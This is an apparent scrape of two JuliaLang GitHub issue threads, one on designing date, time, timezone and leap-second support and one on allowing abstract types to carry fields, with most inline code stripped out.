out with a simpler featureset in pure Julia (a la SimpleDate.jl) with a clean API that can be expanded over time and exclude the ICU dependence. Starting out with a more SQL-like support with Date, Time, DateTime types, lubridate-style arithmetic, duration, period, and interval support, and IO support with parsing/formatting is a solid foundation that provides a lot of basic functionality. As for leap seconds, we could take ICU's approach and ignore them ) (basically leave it to the operating system to figure out). Timezone support is definitely a bigger chunk of work to do manually, but there are simple ways to include basic functionality (as @friend mentioned) and marking it as a future feature for full support I think is reasonable.  @friend  happy to give you commit access to SimpleDate if you want to run with that codebase.  In general, I like @friend's gung ho attitude. My major worry is that we can't start using times without leap seconds and then introduce them later unless we tell people that the date time support is a draft at best.  Thanks @friend, I've enjoyed going over your code today and I'm taking a stab at adding features while trying to follow Calendar.jl's conceptual framework to get a working julia Calendar/Timezone implementation. The thing with leapseconds is there really isn't a lot of consensus on how to handle them at all. Most languages/applications (including ICU) have taken the approach that they're not going to worry about it and let it be an OS problem. Implementation can be tricky, but we can take a stab at it if we deem it important enough. I found blog post here with a good walkthrough of considerations, and also came across a slightly hacky way that Google deals with leapseconds. The problem with a lot of ""solutions"" (hacks mainly) is that they're all pretty much clever ways to trick servers into dealing with an extra second every once in a while and not really a formal API or anything. One thing I thought of was doing a simple cache of year seconds/milliseconds and basing our date parsing off of them. That would allow us to easily manually add seconds as needed, calculate accurate durations/intervals, and also has the added benefit of giving us much faster date parsing. Anyway, I'll plug away a little more and see if I can't push something for review.  I suspect that ignoring leap seconds might be best since 1) everyone else does it, making compatibility difficult if julia doesn't 2) if people do care about leap seconds, they would probably just use TAI (or have their own special method for dealing with it all) I think the easiest and least confusing solution would be to define a TAI timezone (or a seperate TAI datetime type), and define a method for converting between that and UTC by adding/subtracting the appropriate number of seconds that way, if you want the length of an interval for between  and  (stored in UTC), you could do something like  Ok, I just created new repo with a bunch of stuff I've been working on the last 2 weeks. Basically it ended up being a much larger beast than I anticipated, but that most of you were probably aware of. ) I think it's a really good start though for Date, Periods, TimeZone, and DateTime support in pure Julia.  Here's the repo  main influences for the code are as follows  @friend SimpleDate.jl package @friend Calendar.jl package the R  package Java's Joda-time (which is considered a gold standard across languages even and will soon be merged into core Java)  High-level framework/concepts  a  abstract type to represent a certain calendar's way of date calculations (== chronologies in Joda-time) a  abstract type which is subtyped by all identified zones in the Olson tz database (see ) bits types that represent certain relative/absolute durations of time, including , , , , , and  a  immutable with fields for year, month, and day and is parameterized by a certain  (the  is used by default). This is our ""low-precision"" type that doesn't have to worry about timezones and leap seconds and is easier to reason about in terms of period arithmetic. Similar to a partial datetime or LocalDate in Joda, or a simple Date type in many DBMS. This is very fast to work with doing ranges and arithmetic. a  type that can be used to create frequences given start/period/stop inputs. I think a pure  type could represent Intervals in lubridate/Joda where just a start/stop are given (used with arithmetic, not generating frequencies at all) a 64-bit  bits type that is parameterized by a certain  as well as a . It's value represents the number of Rata Die seconds (seconds since 0000-01-01T000000), similar in concept to a Rata Die day number (see code for more date algorithm comments). Since Unix time's epoch is 62135596860 Rata Die seconds, it's trivial to convert Unix timestamps to  types. Using the current default  though, leap seconds are included (try , so wrapping  in  will give you a DateTime 25 seconds or so in the future. (We could correct this with the  function though to give the true current time that someone sees on the clock).  Potentially useful additions  I mentioned a  type; having a  type would map Intervals in lubridate/Joda; this also open up sub-Second possibilities (having a start  instant and noting the attoseconds from that instant); this stems from a lengthy discussion I found in the forums last year I think a  immutable as 's analogue (field-based with Hour, Minute, Second) would be potentially useful as well I would really love to support Temporal Expressions a la  in Ruby link  This is definitely a first draft, and I'm positive there are holes to be plugged and lots of refinement needed. I would really appreciate any questions, critiques, discussion to push this forward. Sources SimpleDate.jl -  -  -  -  -  Algorithms -  Group Discussion -  convo pull request -  Thanks @friend , this is great. A couple of quick comments while I have more of a play with this  The loading of  seems dependent on the  of the Julia process. May this should be developed as a package intially, and loads made relative to  I assume you have a script to generate the timezone.csv when the Olson db is updated?  This currently seems about two orders of magnitude slower than  for simple data arithmetic.  What is the precision of the  . I personally think that its is fine if very high precision time usage needs specialised libraries, but others may disagree.    @friend  I've actually pushed a fix for loading , so let me know if you're still seeing a problem there. I'm actually unsatisfied with how the timezone data is handled in general and this was really just a ""get it working first"" kind of solution. I'd love to brainstorm some more ideas of how to be efficient here. Yeah, there's a script to generate the dataset All of the  stuff is definitely slower right now, particularly if you're using non-UTC timezones. Unacceptably slow really. If you're using the lower precision  type though, it should be faster from my initial benchmarks. The  precision is 64-bits with time measured in seconds, so the max date we can show is . This seems well beyond anything anyone should need for timestamps. I agree that for greater precision, an add-on package could provide even more functionality. The discussion here is what spurred my comment about having a possible  64-bit type that could represent a second^10*-p for higher precision intervals. From the discussion, it seems this was following NumPy's approach, but simpler because we could provide one parameterized type as opposed to NumPy's 26 or so new types they introduced for each power of 10. I guess I just am not familiar with actual use-cases enough to know how to best implement something like this or how best to work with this kind of type. Maybe someone who has had experience or is familiar with sub-second timing needs can comment a little more if this is something Julia should provide out of the box or is something better left to a package. I know @friend was involved a lot in that conversation.   Ok, I added  to METADATA and a README to the package repo, so hopefully more can try it out, kick tires, give it a whirl. I added a  file that runs common operations  times and returns the results. I also included a  file that was my baseline for comparing with the  package. Overall, I'm really pleased with how far the performance has come. @friend's profiler was a great help (and hopefully on windows soon?). Performance-wise,  is either on-par or faster on almost every benchmark. The remaining performance issues are when timezones are specified. I'd say it's at an acceptable/working level (compared to the first draft), but still 2x-4x slower than Calendar.jl. Right now, the timezone data is serialized in matrices for each timezone in the  folder and loaded as the timezone is called for (I like this approach because it manages memory better than slurping the entire db into memory to hold while the user works with timezones). The problem is that with certain timezones, its matrix is 100+ rows and currently, a simple linear search is used to do the lookup. I'm positive some kind of binary/trie/radix/indexed implementation would really help, but I'm actually not very experience with some of these advanced data structures/algorithms to try it out. I'd appreciate anyone's input here. Anyway, it's been a ton of fun working on this stuff and I've really enjoyed how much I've learned about bitstypes and type parameters through the process; it's definitely expanded my understanding on how Julia works and the potential there really is thru the type system. Feedback welcome!  This is really quite amazing. I am a bit taken for the moment, but will certainly jump into this in the next few days.  Vacations are always nice to mull things over. I've thought a lot about the Datetime stuff and particularly about timezone/leap second support and how to do it in a way that's both efficient and maintainable. Here's what I'd like to propose  Including something along the lines of the new Datetime2 package; it includes a simple  and Zulu/UTC-based  implementations (plus support for  types, , , etc.). The code is fast, efficient (~400 lines of code), and provides a lot of date/time functionality without having to deal with any timezone/leap second business. The other main factor here is that this code isn't likely to change (other than normal optimizations, tweaks, etc.).  The creation of a  package (that could possibly live in the JuliaLang organization). This package would include timezone and leap second support similar to what I've pushed in the original  package mentioned earlier in this thread. It would be fully compatible with  code and really just extend it for the additional functionality. The main driving force for splitting this functionality into a separate package that a user would add thru the package manager is maintainability. Leap seconds are announced no more than 6 months before one occurs (either the end of June or end of December). This would fly while Julia is pre-1.0, but imagine if companies are eventually anchoring to v1.0 or v2.0 and new leap seconds are added while a new Julia version is more than 6 months away. It's the same issue with timezone information. The Olson tz database is updated regularly, much more frequently than Julia language releases. Splitting timezone data/functionality into it's own package allows the package to maintain a similar release cadence with Julia, but also include its own ""updates"" to its release branches when they happen, without the fear of breaking user's code.   Feel free to check out the new Datetime2 package (it's really fast!), and I'd love to hear everybody's thoughts on the proposal.  I really appreciate how much thought you've put into this. I think that @friend is the other person here with the most expertise in date and time stuff, and @friend has also done a lot of work on this stuff, so I defer to your collective judgements, but that sounds like a sound plan to me.  I've started using this and think it would be great to have in Base. Getting this finalized will still take some work, but this is very close to the kind of design I'd like to see (as a person without any detailed expertise in time representations).  Neat stuff! I have some reservations about the API, however, in particular the way periods are handled. Eager down-conversion, e.g.,  feels like a mistake. It's an approximation, and it makes period arithmetic non-associative I also don't think splitting the package in two is a great idea.  @friend, can you elaborate more on why you think splitting the package in two is a bad idea? I agree that at first glance, it seems unintuitive and a little weird, but I think the advantages I mentioned in having always-up-to-date timezone/leap second information is a major win. w.r.t timezones, every other major datetime package (Joda, Noda, etc.) ships with a static repo of the timezone data and details a long, complicated download-reformat-recompliation process for manually updating. And for leap seconds, I would argue that we shouldn't support leap seconds in Base under any circumstance. The fact that a new leap second can occur within 6 months would quickly render a static release useless (imagine running a server logging timestamps, expecting leap second support). We'd put ourselves in the same camp as Joda/Noda detailing a manual update process that would surely turn off users. With the package system stabilizing, I think it provides an excellent--and simple--way to provide updates of timezone/leap second data. As for the period arithmetic, I agree that there's a possible gotcha, but there's also not a clear solution without losing some expected behavior or have inconsistencies (e.g. not allow years/months, but allow days). I see a few options  Keep it as is, with default conversions (365 days in a year, etc.) and be upfront/explicit about it and possible gotchas associated with leap years and year + date arithmetic. Note that any  operation already results in an error.  Get rid of inter-period conversions. Then your first example above would calculate the same, but the 2nd, with years(4) + days(1) in parenthesis, would result in an error. Provide a warning/message any time a conversion happens; I initially did this and included months, but it was pretty annoying and probably not a good way to go. Do the same as 2, but also provide a  type (basically a Dict with (Period=&gt;Value), when arithmetic is done, it follows a specific order (greatest to least, first to last, etc.) This is what Noda has done.   I agree with all of this. But these arguments work equally well with the proposition ""we shouldn't merge Datetime into Base"". Splitting Datetime and merging part of it into Base is liable to create two tightly-coupled modules with different release schedules. So instead, let's not split Datetime up, and leave it as a package. As you say, the package system works great. This is also what Calendar does, so it's the solution i prefer. But if Datetime remains a package, then you're free to implement the solution you prefer.  I think DateTime is important enough that there should be a single canonical implementation. Imagine a system where DataFrames depends on one kind of datetime object, and @friend 's TimeSeries package usage a different type of Date. One would be converting between different types of dates all over one's codebase. This arises  quite often in Java projects, where one dependent library uses JODATime, and another uses java.lang.Date ... (at least there are converters available in this case) While one may make such an argument about any facility, I believe datetimes are fundamental enough that this matters a lot. The best (only?) way of ensuring this is to have a solid date time implementation in Base.  On Jul 17, 2013 253 PM, ""Mike Nolta"" notifications@friend.com wrote two is a bad idea? ... With the package system stabilizing, I think it provides an excellent--and simple--way to provide updates of timezone/leap second data. proposition ""we shouldn't merge Datetime into Base"". two tightly-coupled modules with different release schedules. I'm not sure I follow/understand you here. It would probably be clearer if the DateExtensions package existed already, but what I meant to convey earlier and what I forsee is a tightly controlled interaction between the DateTime module in base and the DateExtensions package. The base module would release along with the rest of Julia base, and the DateExtensions would follow the same schedule for any major updates (though I don't forsee many major updates as it will mainly be a data repo). In between releases, the only updates to the DateExtensions package would be timezone and leap second data additions, which would be entirely non - breaking. Is there some concern or potential misstep I'm missing with this kind of setup? -Jacob So instead, let's not split Datetime up, and leave it as a package. As you say, the package system works great. a Dict with (Period=&gt;Value), when arithmetic is done, it follows a specific order (greatest to least, first to last, etc.) This is what Noda has done. Datetime remains a package, then you're free to implement the solution you prefer.  It seems like the main concern about putting everything in Base is the lack of a good way to update things in a timely manner. Perhaps it's time to think outside of the box; is there any reason we couldn't use the machinery inside of Pkg to provide updates to packages that we could ship with Julia? E.g. something in between Base and ~/.julia? Either something that you can♠usingPkg.add()`, (e.g. a simple package that just comes preinstalled) or something that is automatically used a la Base. But these arguments work equally well with the proposition ""we shouldn't merge Datetime into Base"". I think DateTime is important enough that there should be a single canonical implementation. Imagine a system where DataFrames depends on one kind of datetime object, and @friend  's TimeSeries package usage a different type of Date. One would be converting between different types of dates all over one's codebase. This arises quite often in Java projects, where one dependent library uses JODATime, and another uses java.lang.Date ... (at least there are converters available in this case) While one may make such an argument about any facility, I believe datetimes are fundamental enough that this matters a lot. The best (only?) way of ensuring this is to have a solid date time implementation in Base. — Reply to this email directly or view it on GitHub Have some time this week to jump into this conversation. Great stuff.  @friend Thanks for the details. But i read your plan and think, ""This sounds like a hassle. Why bother?"" @friend I don't really buy this argument. There are lots of important packages not in base. If Datetime is high quality, people will use it. If interop becomes a problem, we can ask maintainers to switch. Maybe i'm wrong, but my gut feeling is that the benefit of including this in base is modest at best, and not worth the cost of splitting up the package.  I agree with most of @friend's points. Preventing fracturing of date/time representations is largely a social issue and partly a technical issue of having an official date/time package that's good enough that everyone wants to use it instead of rolling their own. The biggest argument to me for having a time representation in base is that we might want to have functions in base return objects of that type. The  function, for example. But I'm not sure if those should just use float seconds since epoch or whatever.  R has some experience iterating through ways of dealing with time and there is a good man page at  which is pretty long to post here (I'll do it if someone wants it). I think base would be well-served to have at least a foundational time-based type. It can have a timezone field that defaults to  so those data objects that don't need low latency (ie, daily, monthly, yearly) can use it. This time type can then be tagged as an  in a  and will be a path to plotting basic time series. Being able to plot seasonal monthly birth rates from a DataFrame should be available out of the box (base) while those who want more precision and ability to aggregate across specific time periods can access a package.  So after having a go at splitting the  package into two, I have to admit that @friend was right in that it would probably be too much of a hassle. Turns out the actual implementation of having two modules try and be tightly linked is pretty tricky without straight up redefining/overriding exact methods, which doesn't seem like a great user experience (if a workaround to #265 comes about, this could probably be managed). So while splitting the package in two conceptually seems like a great idea for maintainability, practically it doesn't seem to be the best solution. I've merged the revised/enhanced codebase of  into  now and will plan on deleting the  repository. My plan is to keep testing/enhancing  (I actually just pushed temporal expression support which ends up being very natural through using anonymous functions as the ""step"" in a DateRange; see the bottom of the README). I'm happy to help support anything that would like to be included in Base, otherwise,  can continue to be its own package.  @friend @friend  Well, to me the notion of a programming language without date/time support in its standard library seems incomplete. I suppose in the same way a language without BLAS/LAPACK support will seem incomplete to most Julia users. So I would want some kind of date time module in base. But, at the end of day, that's a pretty subjective opinion.  Yes, but things can develop outside and be brought into Base later.  Good point. We haven't gotten beyond 0.2 yet. How about a milestone, say by 0.5?  Re @friend thinking outside the box. If DateTime moves into base, the issues regarding keeping the leap seconds and timezone information up to date come to the forefront.  What if there was a package like , that contained  and a  file, which is installed by default, and possibly auto-updated on julia start (in  by default, so it is easy to turn off?).  That could provide a nice way to keep this information, and possibly other information on a similar release schedule, up to date, and separate from stable code. Or the first call to a function that uses  prints a line warning that it is out of date, sort of like deprecated functions.  @friend, that's a great idea! And we've actually been discussing doing just that over here. I just pushed some changes the other day that should allow us to do this.  Auto-updating anything is not ok. You can't start julia and have it make network connections you didn't ask for. In general anything like that should be opt-in not opt-out.  I think including the data updates in point releases is probably fine.  Good clarification @friend. Yes, we wouldn't be pushing anything automatically, but it could still be as simple as installing an  package that could be manually updated with  and the timezone/leap second data would refresh.  Reopening; this was closed by the accidental bizarro-merge in #7825. ",115,16,850,0,0,569,18,
JuliaLang/julia/4935,0.11117336,JuliaLang,julia,abstract types with fields,54173,671,357,0,4,"This would look something like Foo` to begin with those fields. Some parts of the language internals already anticipate this; it's a matter of hooking up the syntax and filling in a few missing pieces.  plus one to this  plus one (!) I'm wondering if the  keyword is useful, necessary, and/or deliberate?  If he didn't have a  keyword, every declaration of  will need an . Currently  is a oneliner, but  and  is mulitiline until a  marker.  Right, thanks @friend.  plus one this will be very useful!  I'd actually be ok with changing  to always require an , although that would make this a breaking change, which it currently isn't. The  thing feels pretty clunky to me and our current  declarations have always felt a little jarringly open-ended to me.  I kind of agree with Stefan. Making the visual appearance of  more like that of  and  seems like a gain to me.  Yeah, FWIW I was going to say the same.  Fourth-ed  The big problem with making a syntactic change like that is it's going to become a watershed for all the code out there that declares abstract types, splitting that code into before and after versions. Since half of our community likes to live on the edge while the other half likes to use 0.2 (making up numbers here, but half-and-half seems reasonable), that's kind of a big problem. If there was some way we could deprecate the open-ended abstract type declaration, that would avoid the issue.  Now that 0.2 is out, I actually think we should tell people not to use master for work that's not focused on the direct development of Julia itself. I intend to only work from 0.2 until the 0.3 release while developing packages.  Maybe you can hack a temporary thing to end an abstract block if the next line does not start with a field declaration? Backporting this to 0.2.x would allow moving progressively, then you would introduce a deprecation warning, and make it an error with 0.3.  I think that's very reasonable, although it does cut down on the number of people testing out 0.3, which is unfortunate, but probably unavoidable.  @friend, yes, I was thinking something along those lines, but it does feel kind of awful.  As a transitioning solution we might update 0.2.1 to allow a  on the same line after . Then in 0.3 we might issue a warning if it is missing and in 0.4 we can require it. That makes this a rather lengthy process though. Why don't we enable inheriting from  and  instead? It keeps the abstract keyword reserved for grouping types. It will also be cleaner if a immutable can't inherit from a type. Will it cause trouble somewhere if we have a abstract and a concrete type with the same name?  I like the first approach, but it is very, very slow, unfortunately. We definitely cannot allow inheriting from type or immutable. The fact that concrete types are final is crucial. Otherwise when you write  you can't store them inline because someone could subtype  and add more fields, which means that the things in the array might be bigger than 16 bytes. Game over for all numerical work.  That is a good point. It will be too hard to know if Complex should be interpreted as an abstract or concrete type when it is used as a type parameter. What about this? That does not introduce a new keyword, and is backwards compatible.  Very nice idea. So far that seems perfect.  That also potentially allows , which could require all subtypes to be immutable.  very cool  Yes, I like that idea. We can also make  allowed – optionally for now – and eventually require the  and make allow leaving out the  like we do with . Or maybe we just leave it the way it is.  I'm unreasonably excited about this )  New language features are like Christmas.  more support for this from  doing an amazing job here - i can't believe how far you've got and how good this is...)  There is a small question of how to handle constructors with this feature. The obvious thing is for it to behave as if you simply copy &amp; pasted the parent type's fields into the new subtype declaration. However, this creates extra coupling, since changing the parent type can require changes to all subtype code The  constructor has to know about the parent fields. Bug or feature?  It's very non-local, which I don't care for. One thought is that the subtype would have to repeat the declaration and match it. I know that's not very DRY but it's an immediate, easy-to-diagnose error when it happens, and it means that the child declaration is completely self-contained. The point of having fields in the abstract type declaration is to allow the compiler to know that anything of that type will have those fields and know what offset they're at so that you can emit efficient generic code for accessing those fields for all things of that type without needing to know the precise subtype. I don't think the feature is really about avoiding typing fields.  Isn't this a natural coupling which you will always have if you change a parent type? Maybe it would be cleaner to have  i.e. the parent has to be the first value for  (and outer constructors as well).  It's an interesting point that all the value is in making sure the fields are there. Avoiding typing them is much less important.  This occurred to me also, but something about it doesn't quite feel right.  I like @friend s idea, but the syntax must be improved. There is also the issue that the Parent constructor needs to get a pointer from the child constructor to know where to initialize itself.  I am also not sure which form I like more. Introducing the super constructor for abstract types makes it more complicated. But it provides a better distinction which fields are from the parent and which are from the child.  What does  return?   returns a thing like ?   But what kind of thing? There are no instances of abstract types (or they wouldn't be abstract) so what type of object does it return?  I think all this is syntactic sugar and would have do be rewritten into the initially proposed form by the compiler. The  syntax says a little bit more explicit that there is a Parent type nested into the Child type. It still reads like the members would be represented in memory. But again, I am also not sure if this is worth it. The syntax proposed by @friend is also fine and quite natural.  A possibility might be to support simple construction of the Child if Parent has default values for its members. Now Object can be instantiated by in a inner constructor by  or .  Yeah, that's the thing. It's a thing that looks like a function call but isn't at all, which is why I don't care for it. If you're going to do that, you may as well just write , which is shorter and isn't just pointless syntax.  We don't allow for default values of fields at this point. Constructors can have defaults but fields don't have default values. The idea of allowing  or  won't work because we also allow  to not assign a value to .  Maybe this is obvious to everyone but it's good if whatever solution is chosen plays nicely with multiple inheritance in the, possibly distant, future.  multiple inheritance sounds like it would eventually require support for field renaming, which suggests repeating fields.  in that case, could there be a macro that copies the values for the simple case?  so  About the value of fields in abstract types I think that we should aim higher than to just use this to make sure that the fields are there. To me, it would seem that one of the most useful parts of this would be to let the abstract super type support some given abstraction in a way that the subtypes don't have to know about. It should be possible to change the super type's implementation of that abstraction without having to change the sub types (as long as they only rely on the abstraction, and not the actual inherited fields etc.). Or maybe that it is too much to aim for; there's no way to completely avoid name clashes between fields from the super type and sub types if they don't know about each others' implementations. I guess what we really need to figure out is what kind of usage this feature is meant to support.  I don't think that there are many practicle examples where parent and child type are so loosly coupled that the parent fields can be constructed without feeding them through the child constructor. Thinking more about the syntax for base field initialization I think that it would be very usefull if there would be a way to define an own constructor for the parent type. If base field initialization is non-trivial this would reduce code duplication. It should however be optional to call this parent constructor in the child constructor in order override the default behavior.  Stop me if I'm getting off on a whole nother topic but how about Type Factory and Static Members. I was thinking of how to make a type to represent Decibels. The frustrating thing is there's many slightly different, related definitions of decibels. I'd like if the datum could carry around which definition of Decibel it was using as part of it's type without having to copy all of the information for each one. For example, one definition of Decibel is dBm Units ""MilliWatts"" Base 10 Scale 10 Reference 1 mW  You convert a quantity,  of MilliWatts to dBm with . But then you also have dBV. It works similarly except Units Volts Base 10 Scale 20 Reference 1 Volt  And so the conversion is . There are literally dozens of such definitions which could easily share code  Type Factory is a function that returns types. I don't think Julia has this. A Static Member is a value associated with the type itself that need not be repeated for each instance. I don't think Julia has this either. But you can imagine type Decibel{T}     static units     static scale     static base     static reference     value end  function decibelfactory(param, units, scale, base, reference)     return Decibel{param}(units, scale, base, reference) end  dBm = decibelfactory(dBm, ""MilliWatts"", 10.0, 10.0, 1.0)  linearize(qDB) = q.scale * log(q.base, q.value/q.reference)  x = dBm(6)  julia&gt; typeof(x) Decibel{dBm}(""MilliWatts"", 10.0, 10.0, 1.0)  julia&gt; linearize(x) 7.781512503836435   Early versions of what is now StrPack.jl dynamically created types using a macro, so this is entirely possible to do.  I guess we can get ""tempted"" to start doing abstract type AbstractParent   x end type Parent &lt; AbstractParent   # x is inherited end  abstract type AbstractChild1 &lt; AbstractParent   # x is inherited   y end type Child1 &lt; AbstractChild1   # x is inherited from parent   # y is inherited end  abstract type AbstractChild2 &lt; AbstractParent   # x is inherited   z end type Child2 &lt; AbstractChild2   # x is inherited from parent   # z is inherited end  to achieve some kind of inheritance from concrete types...  I have asked myself what the difference is between an abstract type with fields and the ability to inherit from a concrete type. It seems they are almost equal but the abstract type with fields needs one trivial concretization.  They differ in that you can specify fields and collections that only allow that ""trivial concretization"", whereas there is no way to express that when the abstract type and the trivial concretization are condensed to the same thing.  If you could inherit from concrete types, then I could (1) construct an array of Float64, (2) define a new subtype of Float64, (3) try to store it into the array. We don't want to allow that. Of course that could also be achieved by having some types be ""final"", but we felt it was simpler to make all concrete types final rather than have an extra keyword like that.  When I first start learning Julia I felt it badly lacked some features (classes, inheritance) I was used to from Python and C++. However, I soon start to love the simple and clean, yet powerful, ways to code in Julia. Now I can't even figure a greater benefit from having abstract fields, apart from constant field offsets for all subtypes, as pointed by @friend. I really like APIs relying only on methods, thus hiding internals and fields. But it seems that the benefit from constant field offset is lost if using methods to access fields. E.g., imagine we read an API with some abstract class like It can lead us to suppose that  will always return filed , allowing inlining, and benefiting from constant offset efficient code for all subtypes, right? Of Course not, e.g. If we have function which takes an array of different values subtypes of A, and iterate over them So either we stick to methods, getting no really advantage from efficient offset access code (thus, no advantage from abstract fields), or we start using fields directly, losing the internals hiding... DISCLAIMER I may be missing something and therefore saying a lot of BS )  One could go even further, and point out that overloading  reduces the need for this feature even more, since I can effectively add read-only fields using So fields in abstract types really only add something in the rare case where being able to store some piece of state in a value is part of the interface.  @friend I totally get that you need to finalize types in order to have unboxed array content. But with this PR on the table it seems to be that this will allow subtyping ""with tricks"" and I wonder if it will get a common pattern to define all methods on the ""almost concrete"" type and then put a trivial concretization on top of that.  In several cases that already happens (e.g. ), and is fairly common in OO languages generally. If people want to think of concrete types as just a  declaration, that's fine with me. We're happy as long as ""final"" types are possible, and that people are encouraged to use them.  I am also not totally sure if the lack of inheritance of concrete types is really an issue. The nice thing would be that one inherits all methods of a parent type. But maybe the cleaner solution is to use a ""has a"" relation instead of a ""is a"" relation anyway. But this currently means redefining various methods which feels like a drawback compared to inheritance.  I am starting to wonder if this feature is really that necessary. It's kind of hard to see what crucial problem it's solving. The main benefits seem to be  Guarantee that  will always work for all subtypes of an abstract type that has . Otherwise someone could define a subtype and forget to have this field, leading to errors. Guarantee that  is stored at a consistent location in all subtypes.  I actually think that 1. might be an argument against this feature if we allowed overloading of  then a subtype could define a getter and/or setter for  instead of actually storing the field and still work fine with the abstract behavior of the super-type. I'm not sure if 2. is actually enough of a benefit to warrant the entire feature.  In fact, you can imagine a subtype being forced to have a  field but wanting to overriding the  syntax. Then it would be forced to have a vestigial  field that's just wasted and forced on it for no good reason.  Following up Point 1, part of the appeal of abstract types with fields is that they define a kind of interface you know all subtypes will support. For example, linear regression, logistic regression, SVM's and other models all will have a specific weight vector that you'd like to be sure is available. Whether it's through a field or a function is much less important than checking that the implementation satisfies the stated protocol.  To that end, I think that having a formalization of protocols/interfaces is much more useful and important than fields for abstract types, which only addresses a tiny portion of this much bigger issue.  I agree that it's much more important. But there is something nice about the minimal typing required when you have a lot of concrete types that are small variants on a parent abstract type that has almost all of the fields that concrete types will need.  I would say I'm on the ""probably don't need this"" side. If it's really just saving some typing, I don't think it's worth it. I think not having this in addition to the great feature of no sub-typing concrete types makes for very legible code. I think it's been mentioned many times that one of Julia's strengths is the code readability and having a type's fields not be explicit seems like a bummer to me. Any time I see a type that sub-types, I then have to track down that type's parent, moving up the chain until I finally parse all the fields this type happens to inherit. That or use , which also feels a little clunky.  Right, John, I see your point about minimal typing but my stance on this was to still require specifying the fields, which would completely undermine that benefit. I'm still not convinced of any design here that actually would reduce typing at all.  ok, so if we don't need this how i would solve the problem i had that originally led me to this page? i am writing an api - say, for genetic algorithms - and i have a data structure (a type) that is passed to several functions.  this structure will contain information that the ""general"" genetic algorithm uses (a population, parameters describing how to breed, etc) and also some customizable information that the api user should add. so, when i write the library, i know some ""part"" of this data structure, but not others.  other parts will be extended by the library user.  for example, they might need to store some parameters that are needed to generate new individuals. at the function level, i can structure this just fine.  i write my ""general"" functions that do the tasks of breeding, etc.  the user writes functions (with a name i choose) that i call from my code when i want to create new instances (for example).  the user function is passed this same data structure. but at the type level, i don't understand how i can do this without what was described here.  i need to pre-define some fields, which are used by the library code.  the user needs to extend that with other fields after the library is written. if we don't have fields on abstract types, how do we solve the above elegantly? [what i ended up doing was adding a single field, which the user can extend.  so the user then defines their own structure and stores it there.  that works, but it seems clunky to me - for example, it makes extension by two parties at once difficult, since they must agree between themselves what this single extra thing is.  but maybe that's the best that is possible in julia.  i just wanted to set out a clear example in case people are missing a use case...] [i am also worried about ""Whether it's through a field or a function is much less important..."" since functions are not context-dependent in the same way as data (and closures cannot be assigned to package functions, as far as i can see).  in other words, if you're calling the library twice, how do you make functions specific to a particular call?] finally, i think a more formal way of saying the above is that this is the ""expression problem"" (wadler et al).  although i haven't looked at that in some time and may be wrong.  I think the point is that one has to repeat the getter/setter methods for all(!) child types of an abstract type. Using this proposal one only need the abstract type definition with fields and is done. To @friend concern with the ""lost field"" when overriding. I think in most situations the overriden field is still in use. I use in C# properties a lot in the following way double myProperty; double MyProperty {   get { return myProperty; }   set    {     // perform a range check to look if value is in a valid range (e.g. &gt; 0)     myProperty = value;     // update some dependent properties   } }  In the combination with the GUI toolkit WPF these properties can be bound to GUI elements, which makes it very convenient in practice. Without this, the relevance of this feature might not be so high.  The most specific version of a function gets called for each set of arguments. By defining a method for the abstract type, it will be used for all child types, unless there's an even more specific definition.  As discussed earlier today with @friend A concrete example for which this could be useful would be to simplify defining methods for , , , , and a future hypothetical  matrix types. Each of these matrix types would require a field for the diagonal elements. Most of these would need also at least one sub/superdiagonal field, and quite possibly more. A hypothetical supertype of these particular matrix types would simplify the implementation of basic linear algebra functions. For example,  should retrieve the appropriate super/sub/diagonal field, or otherwise generate a zero vector of the correct length.  I'll mention that a definition like this is valid, since we don't strictly check things Then each subtype just has to have a field of that name.  I looked through this entire thread. I am still not convinced that abstract type with fields is necessary. I have worked on a dozen of Julia packages, and doesn't come across a single time where I want a super-type to enforce that all subtypes have to share some common fields. There are plenty of cases that one would want to enforce that all subtypes can provide information of some sort. However, all these can be done through (multi-dispatch) methods instead of fields. Requiring methods to be implemented is far more flexible than requiring the presence of a particular set of fields. The following example should illustrate this point. A common information that should be provided by all kinds of matrices is the number of rows &amp; columns. Then, should we do the following? Of course not. There are numerous ways to represent the shape, and using two integers is just one of them. For example, I can use a tuple or a vector, etc, or if I want to implement a SquareMatrix type, I can just use one integer to represent the shape. I think the current Julian way does this right -- it requires the size(a, d) method to be implemented instead of requiring what fields should be present. To me, fields are almost always about implementation details. Interface should be expressed using methods. Abstract types with fields are kind of making the fields part of the programming interface (API). I am yet to be convinced that this is a good idea. Using fields in abstract types also make things unnecessarily complicated. What if the subtype want the fields to be of different types than those being declared in the abstract type?  People mentioned the usefulness to allow properties to be inherited. I agree with this. However, properties are more like methods than fields.  In terms of saving typing, one can always use macros. If you find your self writing a lot of types that share a subset of fields, you can write a macro to generate those shared parts so that you don't have to repeat them many times.  I now agree this is a kind of marginal feature. It's easy to misuse; as you point out it's undesirable for read-only properties.  @friend I wanted to come up with an example like that one that @friend provided, which I thought would not be possible. Is that pattern used anywhere in the Julia source code? In combination with field overloads this could be very interesting. One could provide default implementations on abstract types that make certain assumptions on the fields available. A concrete type either has provide the field or provide an equivalent field overload. I kind of agree with @friend that currenty methods are used as public interfaces while fields are implementation details. Making fields overloadable can break this view. Then the fields/properties can become part of the interface. In C# usually the convention is used that properties start with an upper case letter to make clear that this is part of the interface. I am actually not totally sure if we need properties in Julia. The nice thing about them is a) the point syntax b) that getter and setter have the same name. b) might not be that important in Julia as we have this nice ! notation. So one could define properties as wheel( car ) # gets the wheel wheel!( car, anotherWheel ) #sets the wheel in car  The dot syntax seems to be a really huge deal for many people. It is arguably one of the most popular bits of syntax among all modern languages. Modern languages need to support dot-oriented programming )  Well, from my point of view it is a plus that Julia does not support the dot syntax for member functions. But fields and properties are a different thing these are things that definately belong to an object. But on the other hand it would be kind of consequent to not allow field overloads and do all getters/setters with methods like I outlined above. Then one has a cleaner separation between what is an interface and what is the implementation detail  I agree that many properties should be methods, like . I would like to add dot overloading, but I don't want to see a profusion of things like  as a replacement for these.  If something like getfield(AMyAbstractType, Field{x}) = 0  can be done, then nothing stops one to start doing at the beginning of the code getfield{S}(oAny, Field{S}) = @friend $S($o)  and do a = [1 2; 3 4] a.size  everywhere. ( How I tested it abstract Field{S} getfield{S}(oAny, Type{Field{S}}) = @friend $S($o) a = [1 2; 3 4] getfield(a, Field{size})  ( When I first arrive at Julia, I tried to do something like that (because I though Julia dot syntax was broken D ))  That is the danger. The C# developer in me wants it but it will break the view that fields are implementation details. Maybe it needs a more well defined use case. I think @friend wanted this for pycall.  That hack fills me with dread. Not to mention that  would probably just break the whole system.  If you give it a try, you'll see it works. (Images uses this technique.) There is no 